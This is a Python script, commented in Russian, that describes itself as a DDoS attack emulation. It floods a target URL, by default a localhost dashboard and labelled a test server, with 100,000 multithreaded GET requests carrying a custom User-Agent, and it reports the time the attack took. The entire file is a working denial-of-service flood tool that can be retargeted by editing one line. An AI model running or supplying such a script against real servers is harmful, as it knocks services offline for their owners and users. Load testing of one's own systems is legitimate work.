import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import time

# Адрес вашего сервера
target_url = "http://localhost/dashboard/"  # Замените на адрес вашего тестового сервера

# Количество запросов
num_requests = 100000  # Количество запросов

# Ваш кастомный User-Agent
CUSTOM_USER_AGENT = ""  # Замените на ваш User-Agent

# Функция для отправки запросов с кастомным User-Agent
def send_request():
    try:
        # Отправляем GET запрос с кастомным User-Agent
        headers = {
            "User-Agent": CUSTOM_USER_AGENT
        }
        response = requests.get(target_url, headers=headers)
        print(f"Запрос отправлен, статус: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Ошибка при отправке запроса: {e}")


# Функция для запуска многопоточного DDoS
def start_ddos():
    print(f"Запуск эмуляции DDoS-атаки на {target_url}...")

    # Запускаем пул потоков
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Отправляем много запросов с помощью потоков
        for _ in range(num_requests):
            executor.submit(send_request)


# Время начала атаки
start_time = time.time()

# Запуск DDoS-атаки
start_ddos()

# Время завершения атаки
end_time = time.time()

print(f"Атака завершена. Время выполнения: {end_time - start_time} секунд.")
